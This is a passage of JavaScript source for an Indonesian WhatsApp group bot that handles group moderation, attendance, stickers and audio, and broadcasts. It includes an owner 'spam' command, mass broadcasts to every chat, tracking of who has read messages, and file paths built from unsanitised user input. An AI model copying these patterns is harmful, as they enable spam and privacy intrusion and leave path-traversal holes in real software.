	    	case 'wa.me':
	    	case 'wame':		
                    if (!isRegistered) return reply(mess.only.userB)
  					if (isLimit(sender)) return reply(mess.limituser)
  					client.updatePresence(from, Presence.composing) 
  					options = {
  					text: `*「 SELF WHATSAPP 」*\n\n_Request by_ : @${sender.split("@s.whatsapp.net")[0]}\n\nYour link whatsapp : https://wa.me/${sender.split("@s.whatsapp.net")[0]}\nOr ( / )\nhttps://api.whatsapp.com/send?phone=${sender.split("@")[0]}`,
  					contextInfo: { mentionedJid: [sender] }
  					}
  					client.sendMessage(from, options, text, { quoted: mek } )
  					break
			case 'sider':
			case 'nyimak': //By IXB TEAM
				    if (!isRegistered) return reply(mess.only.userB)
				    if (isLimit(sender)) return reply(mess.limituser)
				    if (isBanned) return reply(mess.only.benned)
				    if (!isGroup) return reply(mess.only.group)
				    if (!isGroupAdmins) return reply(mess.only.admin)
			      	if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply chat bot!')
			      	try{
                    infom = await client.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
                    tagg = []
                    shape = '▢'
                    teks = `Ciee, Ngeread... \n\n`
                    for(let i of infom.reads){
                    teks += '═════════════════\n• Nama : ' + '@' + i.jid.split('@')[0] + '\n'
                    teks += `• Jam : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('HH:mm:ss') + '\n'
					teks += `• Tanggal : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY') + '\n'
                    tagg.push(i.jid)
					}
					teks += `═════════════════\n\n`
					mentions(teks, tagg, true)
			     	}catch (e) {
					console.log(color(e), 'red')
					reply('Reply chat bot!')
					} 
					break
		    case 'spammer':
			case 'spam': //By IXB TEAM
				    if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
					client.sendMessage(from, spammer(), text)
					break
		    case 't':
				    if (!isRegistered) return reply(mess.only.userB)
				    if (isLimit(sender)) return reply(mess.limituser)
				    if (isBanned) return reply(mess.only.benned)
				    if (!isGroup) return reply(mess.only.group)
				    if (!isGroupAdmins) return reply(mess.only.admin)
					members_id = []
					teks = `│• INFO : ${body.slice(8)}\n│\n`
					for (let mem of groupMembers) {
					teks += `│•HAY KAK @${mem.jid.split('@')[0]}\n`
					members_id.push(mem.jid)
					}
					mentions(`╭───✪ NONGOL ✪───\n│\n`+teks+`╰───〘 ${namabot} 〙───`, members_id, true)
					break  
			case 'mulaiabsen':
			    	if (!isRegistered) return reply(mess.only.userB)
			    	if (isLimit(sender)) return reply(mess.limituser)
			    	if (isBanned) return reply(mess.only.benned)
			    	if (!isGroup) return reply(mess.only.group)
			    	if (!isGroupAdmins) return reply(mess.only.admin)
					if (isAbsen) return reply('Absen sedang berjalan')
					mabsen.push(from)
					fs.writeFileSync('./database/kelompok/absen.json', JSON.stringify(mabsen))
					fs.appendFileSync(`./strg/database/${from}`, JSON.stringify(mabsen))
					reply('Sukses memulai absen di group ini')
					break
			case 'absen':			
					if (!isGroup) return reply(mess.only.group)
					if (!isAbsen) return reply('Tidak ada absen berlangsung!')
					const wasVote = absenGC.includes(sender)
					if (wasVote) return reply('Kamu sudah absen!')  		
					absenGC.push(sender)
					fs.writeFileSync(`./strg/database/${from}`, JSON.stringify(absenGC))
                    reply('Terima kasih sudah absen!')
			     	break	
			case 'listabsen':
				    if (!isRegistered) return reply(mess.only.userB)
					if (!isGroup) return reply(mess.only.group)  
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isAbsen) return reply('Tidak ada absen berlangsung!')  
			    	teks = 'Daftar absen :\n'
			     	for (let absenb of absenGC) {
			    	teks += `~> @${absenb.split('@')[0]}\n`
			      	}
			    	teks += `Total : ${absenGC.length}`
			    	client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absenGC}})
			    	break	
			case 'dellabsen':
				    if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isAbsen) return reply(`Tidak ada sesi absen di group ini\n${prefix}mulaiabsen untuk memulai absen`)
				    delete absenGC
					let offabsenGC = mabsen.indexOf(from)
		            mabsen.splice(offabsenGC, 1)
					fs.writeFileSync('./database/kelompok/absen.json', JSON.stringify(mabsen))
					reply('Sukses menghapus sesi absen')
					break
			case 'listonline':
					if (!isGroup) return reply(mess.only.group) 
					if (!isGroupAdmins) return reply(mess.only.admin)
					let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
					let online = [...Object.keys(client.chats.get(ido).presences), client.user.jid]
					client.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
						quoted: mek,
						contextInfo: { mentionedJid: online }
					})
					break
			case 'totalpesan':
			    	if (!isRegistered) return reply(mess.only.userB)
				    if (isLimit(sender)) return reply(mess.limituser)
				    if (isBanned) return reply(mess.only.benned)
			     	if (!isGroup) return reply(mess.only.group)
			     	if (!isGroupAdmins) return reply(mess.only.admin)
				    let mCount = {}
				    let totalM = 0
					await client.loadAllMessages(from, mek => {						
					let user = mek.key.fromMe ? client.user.jid : mek.participant ? mek.participant : from.includes('g.us') ? '' : from
					if (!user) return
					if (user in mCount) mCount[user]++
					else mCount[user] = 1
					totalM++
					}, 1000)
					let sorted = Object.entries(mCount).sort((a, b) => b[1] - a[1])
					let pesann = sorted.map(v => `${v[0].replace(/(\d+)@.+/, '@$1')}: ${v[1]} pesan`).join('\n')
					client.sendMessage(from, `${totalM} pesan terakhir\n${pesann}`, text ,{ contextInfo: { mentionedJid: sorted.map(v => v[0]) } })				
					break
		case 'ivan':
				    if (!isOwner) return reply(mess.only.ownerB)
					members_id = []
					teks = `│• INFO : ${body.slice(8)}\n│\n`
					for (let mem of groupMembers) {
					teks += `│•👉👈@${mem.jid.split('@')[0]}\n`
					members_id.push(mem.jid)
					}
					mentions(`╭───✪〘 TAG BY IVAN 〙✪───\n│\n`+teks+`╰───〘 ${namabot} 〙───`, members_id, true)
					break
		case 'clearall':
			        if (!isOwner) return reply(mess.only.ownerB)
					anu = await client.chats.all()
					client.setMaxListeners(25)
					for (let _ of anu) {
						client.deleteChat(_.jid)
					}
                    reply("Success clear all chat")
					break      
			case 'toptt':
			        	if (!isRegistered) return reply(mess.only.userB)
		        		if (isBanned) return reply(mess.only.benned)
		         		if (isLimit(sender)) return reply(mess.limituser)
						if (!isQuotedAudio) return reply('Reply vnnya!')
				    	reply(mess.wait)
				    	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    	media = await client.downloadAndSaveMediaMessage(encmedia)
			    		ran = getRandom('.mp3')
				    	exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Gagal mengkonversi audio ke ptt')
						topt = fs.readFileSync(ran)
						client.sendMessage(from, topt, audio, {mimetype: 'audio/mp4', quoted: mek, ptt:true})
						fs.unlinkSync(ran)
						})
					break
			case 'toaudio':
					 	if (!isRegistered) return reply(mess.only.userB)
			        	if (isBanned) return reply(mess.only.benned)
				        if (isLimit(sender)) return reply(mess.limituser)
						if (!isQuotedAudio) return reply('Reply vnnya!')
				     	reply(mess.wait)
						await sleep(2000)
				    	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			    		media = await client.downloadAndSaveMediaMessage(encmedia)
				    	ran = getRandom('.mp3')
				    	exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Gagal mengkonversi ptt ke audio')
						topt = fs.readFileSync(ran)
						client.sendMessage(from, topt, audio, {mimetype: 'audio/mp4', quoted: mek})
						fs.unlinkSync(ran)
						})
					break
		case 'blockk':
					if (!isGroup) return reply(mess.only.group)
				    if (!isAdmin) return reply(`Maaf perintah ini hanya bisa digunakan oleh admin ${namabot}`)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di block')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentions(`Perintah diterima, memblokir @${mentioned[0].split('@')[0]}`, mentioned, true)
					client.blockUser (`${mentionUser}`, "add")
					break
		case 'unblockk':
					if (!isGroup) return reply(mess.only.group)
				    if (!isAdmin) return reply(`Maaf perintah ini hanya bisa digunakan oleh admin ${namabot}`)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di unblock')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentions(`Perintah diterima, membuka blockir @${mentioned[0].split('@')[0]}`, mentioned, true)
				    client.blockUser (`${mentionUser}`, "remove")
					break
		case 'block':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di block')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentions(`Perintah diterima, memblokir @${mentioned[0].split('@')[0]}`, mentioned, true)
					client.blockUser (`${mentionUser}`, "add")
					break
		case 'unblock':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di unblock')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentions(`Perintah diterima, membuka blockir @${mentioned[0].split('@')[0]}`, mentioned, true)
				    client.blockUser (`${mentionUser}`, "remove")
					break
		case 'leave':			
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
					client.updatePresence(from, Presence.composing) 
					reply('Bot di perintahkan keluar oleh Owner') 
					await sleep(2000)
					client.groupLeave(from) 
					break
		case 'bc': 
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Mau broadcast apaan lu ngab :v')
					anu = await client.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					buffet = await client.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					client.sendMessage(_.jid, buffet, image, {caption: `*❏ BROADCAST*\n\n${body.slice(4)}`})
					}
					reply('Suksess broadcast')
					} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					buffet = await client.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					client.sendMessage(_.jid, buffet, video, {caption: `*❏ BROADCAST*\n\n${body.slice(4)}`})
					}
					reply('Suksess broadcast')
				    } else {
					for (let _ of anu) {
					sendMess(_.jid, `*❏ BROADCAST*\n\n${body.slice(4)}`)
					}
					reply('Suksess broadcast')
					} 
					break
			case 'addsticker':
			     	if (!isOwner) return reply(mess.only.ownerB)
			    	if (!isQuotedSticker) return reply('Reply stiker nya')
			    	svstw = body.slice(12)
			    	if (!svstw) return reply('Nama sticker nya apa?')
			    	boijq = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
			    	delbq = await client.downloadMediaMessage(boijq)
			    	setiker.push(`${svstw}`)
			    	fs.writeFileSync(`./sticker/${svstw}.webp`, delbq)
			     	fs.writeFileSync('./sticker/sti.json', JSON.stringify(setiker))
			    	client.sendMessage(from, `Sukses menambahkan sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, { quoted: mek })
			    	await limitAdd(sender)
                    break
			case 'addaudio':
                    if (!isOwner) return reply(mess.only.ownerB)
                    if (!isQuotedAudio) return reply('Reply vnnya!')
			    	svstq = body.slice(10)
			    	if (!svstq) return reply('Nama audionya apa?')
			    	boijw = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
			    	delbw = await client.downloadMediaMessage(boijw)
			     	audionye.push(`${svstq}`)
			    	fs.writeFileSync(`./audio/${svstq}.mp3`, delbw)
			    	fs.writeFileSync('./audio/aud.json', JSON.stringify(audionye))
			    	client.sendMessage(from, `Sukses menambahkan audio\nCek dengan cara ${prefix}listaudio`, MessageType.text, { quoted: mek })
			    	break
			case 'getsticker':
			case 'gets':
				        if (!isRegistered) return reply(mess.only.userB)
				        if (isBanned) return reply(mess.only.benned)
				        if (isLimit(sender)) return reply(mess.limituser)
				        if (args.length < 1) return reply(`Example: ${prefix + command} pinguin`)
						try{
						namastc = body.slice(12)
						result = fs.readFileSync(`./sticker/${namastc}.webp`)
						client.sendMessage(from, result, sticker, { contextInfo: { "mentionedJid": mem }})
					    } catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply(`❌ *ERROR* ❌\nSticker tidak ditemukan!\nUntuk list sticker kirim ${prefix}liststicker`)
					    }
						break
			case 'stickerlist':
			case 'liststicker':
				        if (!isRegistered) return reply(mess.only.userB)
				        if (isBanned) return reply(mess.only.benned)
				        if (isLimit(sender)) return reply(mess.limituser)
						teks = '*Sticker List :*\n\n'
						for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
						}
						teks += `\n*Total : ${setiker.length}*`
						client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
						break
			case 'getaudio':
				        if (!isRegistered) return reply(mess.only.userB)
				        if (isBanned) return reply(mess.only.benned)
				        if (isLimit(sender)) return reply(mess.limituser)
				        if (args.length < 1) return reply(`Example: ${prefix + command} mama muda`)
						try{
						namastc = body.slice(10)
						buffer = fs.readFileSync(`./audio/${namastc}.mp3`)
					    client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', ptt:true})
					    } catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply(`❌ *ERROR* ❌\nAudio tidak ditemukan!\nUntuk list audio kirim ${prefix}listaudio`)
					    }
						break
			case 'listaudio':
			case 'audiolist':
				        if (!isRegistered) return reply(mess.only.userB)
			        	if (isBanned) return reply(mess.only.benned)
			         	if (isLimit(sender)) return reply(mess.limituser)
						teks = '*List Audio:*\n\n'
						for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
						}
						teks += `\n*Total : ${audionye.length}*`
						client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
						break
		    case 'bcc': 
				        if (!isAdmin) return reply(`Maaf perintah ini hanya bisa digunakan oleh admin ${namabot}`)
						if (args.length < 1) return reply('Mau broadcast apaan lu ngab :v')
					    anu = await client.chats.all()
					    if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						for (let _ of anu) {
						client.sendMessage(_.jid, buff, image, {caption: `*❏ BROADCAST*\n\n${body.slice(4)}`})
						}
						reply('Suksess broadcast')
					    } else {
						for (let _ of anu) {
						client.sendMessage(_.jid, `*❏ BROADCAST*\n\n${body.slice(4)}`, text)
						}
						reply('Suksess broadcast')
					    }
					    break			
		case 'grup':
		case 'gc':
		case 'group':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args[0] === 'buka') {
					var nomor = mek.participant
					const buka = {
					text: `Group telah dibuka oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nSekarang semua member dapat mengirimkan pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					client.groupSettingChange(from, GroupSettingChange.messageSend, false)
					reply(buka)
					} else if (args[0] === 'tutup') {
					var nomor = mek.participant
					const tutup = {
					text: `Group telah ditutup oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nSekarang hanya admin yg dapat mengirimkan pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					client.groupSettingChange(from, GroupSettingChange.messageSend, true)
					reply(tutup)
					}
					break      
            case 'admin':
            case 'owner':
            case 'creator':
            case 'developer':
				    const vcard = 'BEGIN:VCARD\n'+'VERSION:3.0\n'+`FN:${NameOwner}\n`+`ORG:Owner ${namabot};\n`+`TEL;type=CELL;type=VOICE;waid=${OwnerNumber}:+${OwnerNumber}\n`+'END:VCARD'
			    	client.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: mek})
			    	client.sendMessage(from, 'Nih ownerku...',MessageType.text, { quoted: mek} )
					break    
            case 'setname':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply(`Kasih nama groupnya yang baru min!\nContoh: ${prefix + command} OFFICIAL GROUP IXB-BOT`)
					namagcnya = `${body.slice(9)}`
					client.groupUpdateSubject(from, namagcnya)
					client.sendMessage(from, `✓Sukses mengganti nama group menjadi ${body.slice(9)}`, text, {quoted: mek})
					break
            case 'setdesc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply(`Kasih descriptionnya min!\nContoh: ${prefix + command} OFFICIAL GROUP IXB-BOT`)
					client.groupUpdateDescription(from, `${body.slice(9)}`)
					okyaw = `Sukses mengganti description group!\nDescription group diubah oleh admin ${pushname}\nNew desc: ${body.slice(9)}\n`
					client.sendMessage(from,  okyaw, text, {quoted: mek})
					break
            case 'demote':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di turunkan admin group!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentions(`Perintah diterima, menurunkan @${mentioned[0].split('@')[0]} menjadi member`, mentioned, true)
					client.groupDemoteAdmin(from, mentionUser)
					break
			case 'promote':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadikan admin group!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentions(`Perintah diterima, @${mentioned[0].split('@')[0]} Anda naik menjadi admin group `, mentioned, true)
					client.groupMakeAdmin(from, mentionUser)
					break
	        case 'kick':
		         	if (!isOwner) return reply(mess.only.ownerB)
					if (!isGroup) return reply(mess.only.group)
				//	if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin ditendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
					client.groupRemove(from, mentionUser)
					break
			case 'odemote':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di turunkan admin group!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentions(`Perintah diterima, menurunkan @${mentioned[0].split('@')[0]} menjadi member`, mentioned, true)
					client.groupDemoteAdmin(from, mentionUser)
					break
			case 'opromote':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadikan admin group!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentions(`Perintah diterima, @${mentioned[0].split('@')[0]} Anda naik menjadi admin group `, mentioned, true)
					client.groupMakeAdmin(from, mentionUser)
					break
	        case 'okick':
		         	if (!isOwner) return reply(mess.only.ownerB)
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin ditendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
					client.groupRemove(from, mentionUser)
					break
		case 'listadmin':
					if (!isGroup) return reply(mess.only.group)
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
					no += 1
					teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break	
		case 'leveling':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					if (Number(args[0]) === 1) {
					if (isLevelingOn) return reply('*Fitur level sudah aktif sebelum nya*')
					_leveling.push(from)
					fs.writeFileSync('./database/kelompok/leveling.json', JSON.stringify(_leveling))
					reply(`Leveling siap digunakan!`)
				    } else if (Number(args[0]) === 0) {
					let offlevel = _leveling.indexOf(from)
		            _leveling.splice(offlevel, 1)
					fs.writeFileSync('./database/kelompok/leveling.json', JSON.stringify(_leveling))
					reply(`Leveling nonaktif`)
					} else {
					reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					}
					break
			case 'mute':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (isMuted) return reply(`udah mute`)
					mute.push(from)
					fs.writeFileSync('./database/kelompok/mute.json', JSON.stringify(mute))
					reply(`Bot berhasil dimute di group ini\n${prefix}unmute untuk unmute!`)
					break
		case 'welcome':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					if (Number(args[0]) === 1) {
					if (isWelkom) return reply('Fitur welcome sudah aktif sebelum nya')
					welkom.push(from)
					fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
					reply('Sukses mengaktifkan fitur welcome di group ini')
					} else if (Number(args[0]) === 0) {
					let offwelcome = welkom.indexOf(from)
		            welkom.splice(offwelcome, 1)
					fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
					reply('Sukses menonaktifkan fitur welcome di group ini')
					} else {
					reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					}
					break		
		case 'modeanime':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
					if (isAnime) return reply('Mode anime sudah aktif')
					anime.push(from)
					fs.writeFileSync('./database/json/anime.json', JSON.stringify(anime))
					reply(`Sukses mengaktifkan mode anime di group ini`)
					} else if (Number(args[0]) === 0) {
					let offanime = anime.indexOf(from)
		            anime.splice(offanime, 1)
					fs.writeFileSync('./database/json/anime.json', JSON.stringify(anime))
					reply(`Sukes menonaktifkan mode anime di group ini`)
					} else {
					reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					}
					break
		case 'nsfw':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					if (Number(args[0]) === 1) {
					if (isNsfw) return reply(' *Sudah aktif gan*  !!')
					nsfw.push(from)
					fs.writeFileSync('./database/bot/nsfw.json', JSON.stringify(nsfw))
					reply('Sukses mengaktifkan NSFW di group ini')
					} else if (Number(args[0]) === 0) {
					let offnsfw = nsfw.indexOf(from)
		            nsfw.splice(offnsfw, 1)
					fs.writeFileSync('./database/bot/nsfw.json', JSON.stringify(nsfw))
					reply('Sukses menonaktifkan NSFW di group ini')
					} else {
					reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					}
					break
                case 'antilink':
                    if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					if (Number(args[0]) === 1) {
					if (isAntilink) return reply('Anti link group sudah aktif')
					antilink.push(from)
					fs.writeFileSync('./database/kelompok/antilink.json', JSON.stringify(antilink))
					reply('Sukses mengaktifkan anti link group di group ini ✔️')
					client.sendMessage(from,`Perhatian kepada seluruh member anti link group aktif apabila anda mengirim link group anda akan di kick dari group`, text)
					} else if (Number(args[0]) === 0) {
					if (!isAntilink) return reply('Mode anti link group sudah disable')
					let offantilink = antilink.indexOf(from)
		            antilink.splice(offantilink, 1)
					fs.writeFileSync('./database/kelompok/antilink.json', JSON.stringify(antilink))
					reply('Sukes menonaktifkan anti link group di group ini ✔️')
					} else {
					reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					}
					break
				case 'antiporno':
						if (!isOwner) return reply ('Maaf perintah ini hanya dapat diaktifkan oleh owner karena masih beta!')
						if (!isGroup) return reply(mess.only.group)
		            //  if (!isGroupAdmins) return reply(mess.only.admin)
		                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
		                if (args.length < 1) return reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
		                if (Number(args[0]) === 1) {
			            if (isAntinsfw) return reply('Anti porno group sudah aktif')
			            antinsfw.push(from)
			            fs.writeFileSync('./database/kelompok/antinsfw.json', JSON.stringify(antinsfw))
			            reply('Sukses mengaktifkan anti porno group di group ini ✔️')
			            client.sendMessage(from,`Perhatian kepada seluruh member anti porno aktif apabila anda mengirim foto 18+ bot akan kick anda dari group`, text)
		                } else if (Number(args[0]) === 0) {
			            if (!isAntinsfw) return reply('Mode anti porno sudah disable')
						let offnsfw = antinsfw.indexOf(from)
		                antinsfw.splice(offnsfw, 1)
			            fs.writeFileSync('./database/kelompok/antinsfw.json', JSON.stringify(antinsfw))
			            reply('Sukes menonaktifkan anti porno group di group ini ✔️')
		                } else {
			            reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
		                }
		                break
			case 'antivirtex':
			case 'antivirtext':
				if (!isGroupAdmins) return reply(mess.only.admin)
		        if (!isGroup) return reply(mess.only.group)
		        if (!isBotGroupAdmins) return reply(mess.only.Badmin)				
				if (args.length < 1) return reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
				if (Number(args[0]) === 1) {
				if (isAntiVirtex) return reply(`Fitur ${command} sudah aktif`)
				antivirtex.push(from)
				fs.writeFileSync('./database/kelompok/antivirtex.json', JSON.stringify(antivirtex))
				reply(`Berhasil mengaktifkan fitur ${command} pada group ini`)
				} else if (Number(args[0]) === 0) {
				if (!isAntiVirtex) return reply(`Fitur ${command} sudah nonaktif`)
				let offvirtex = antivirtex.indexOf(from)
		        antivirtex.splice(offvirtex, 1)
				fs.writeFileSync('./database/kelompok/antivirtex.json', JSON.stringify(antivirtex))
				reply(`Berhasil menonaktifkan fitur ${command} pada group ini`)
				} else {
				reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
				}
				break
			case 'setpp':
				if (!isGroupAdmins) return reply(mess.only.admin)
		        if (!isGroup) return reply(mess.only.group)
		        if (!isBotGroupAdmins) return reply(mess.only.Badmin)				
				reply(mess.wait)
				media = await client.downloadAndSaveMediaMessage(mek)
				await client.updateProfilePicture (from, media)
				fs.unlinkSync(media)
				reply(`Sukses Mengganti Profil Group *${groupMetadata.subject}*`)
                break
			case 'tagme':
					if (!isGroup) return reply(mess.only.group)
					var noom = mek.participant
					const tag = {
					text: `@${noom.split("@s.whatsapp.net")[0]} tag!`,
					contextInfo: { mentionedJid: [noom] }
					}
					client.sendMessage(from, tag, text, {quoted: mek})
                    break
            case 'event':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					///if (!isOwner) return reply(mess.only.ownerB) 
					if (args.length < 1) return reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					if (Number(args[0]) === 1) {
					if (isEventon) return reply('*Fitur event sudah aktif sebelum nya*')
					event.push(from)
					fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
					reply('Sukses mengaktifkan fitur event di group ini')
					} else if (Number(args[0]) === 0) {
					let offevent = event.indexOf(from)
		            event.splice(offevent, 1)
					fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
					reply('Sukses menonaktifkan fitur event di group ini')
					} else {
					reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					}
					break
			case 'simi':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
